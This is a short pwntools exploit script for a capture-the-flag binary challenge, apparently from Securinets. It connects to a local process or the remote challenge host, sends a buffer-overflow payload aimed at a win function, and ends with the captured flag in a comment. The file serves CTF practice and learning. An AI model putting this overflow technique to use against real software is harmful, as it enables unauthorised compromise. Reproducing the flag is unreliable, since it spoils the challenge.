#!/usr/bin/env python3
from pwn import *

exe = ELF("./main")
# libc = ELF("./libc", checksec=False)

context.binary = exe
context.log_level = 'debug'

gdbscript="""
b*0x000000000040130b
b*0x0000000000401380
c"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("pwn-14caf623.p1.securinets.tn", 9000)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

win = 0x4011a5
payload = b"AB"*(198) + b"\xa6"*17
sa(b": ", payload)
sa(b": ", b"exit")

p.interactive()

#Securinets{my_zip_doesnt_zip}